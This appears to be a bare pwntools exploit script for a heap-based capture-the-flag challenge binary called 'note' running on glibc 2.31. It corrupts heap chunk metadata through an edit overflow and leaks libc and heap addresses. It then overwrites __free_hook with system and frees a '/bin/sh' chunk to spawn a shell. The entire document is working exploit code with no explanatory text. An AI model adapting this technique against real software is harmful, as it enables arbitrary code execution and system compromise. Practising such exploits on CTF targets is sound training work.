from pwn import *

io = process('./note')
libc = ELF('./libc-2.31.so')

def add(size):
    print(io.recvuntil('>> '))
    io.sendline('1')
    print(io.recv())
    io.sendline(str(size))
def delete():
    print(io.recvuntil('>> '))
    io.sendline('4')
def view():
    print(io.recvuntil('>> '))
    io.sendline('2')
def edit(data):
    print(io.recvuntil('>> '))
    io.sendline('3')
    print(io.recv())
    io.sendline(data)


add(0x7f)
payload = p64(0)*26+p32(0)+p64(0x21)+p64(0xffffffffffffffff)
edit(payload)
delete()

add(0x320)
delete()
add(0x10)
add(0x30)
add(0x320)
payload = b'\0'*236+p64(0)+p64(0x451)
edit(payload)
delete()
add(0x20)
view()
io.recvuntil('--->\n')
io.recv(4)
libc.address = u64(io.recv(8)) - 0x1ebfe0
heapbase = u64(io.recv(8)) - 0x3c0
add(0x310)
add(0x330)
delete()
add(0x7f)
payload = b'\0'*(128+28)+p64(libc.sym['__free_hook'])
edit(payload)
add(0x330)
payload = b'\0'*236+p64(0)+p64(0)+p64(libc.sym['system'])
edit(payload)
add(0x7f)
payload = b'\0'*236+p64(0)+p64(0x111)+b'/bin/sh'
edit(payload)
delete()
io.interactive()
